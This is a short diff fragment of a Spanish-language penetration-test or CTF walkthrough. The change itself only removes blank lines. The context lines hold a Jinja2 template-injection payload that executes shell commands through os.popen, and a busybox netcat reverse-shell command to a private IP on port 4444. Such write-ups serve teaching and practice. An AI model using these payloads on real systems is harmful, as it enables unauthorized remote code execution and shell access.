@@ -261,11 +261,9 @@ Utilizamos el siguiente payload para conseguir ejecución remota de comandos:
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
-
 Somos **root**.
 
 Utilizamos `busybox` para mandarnos una reverse shell:
-
 ```bash
 busybox nc 192.168.93.128 4444 -e bash
 ```
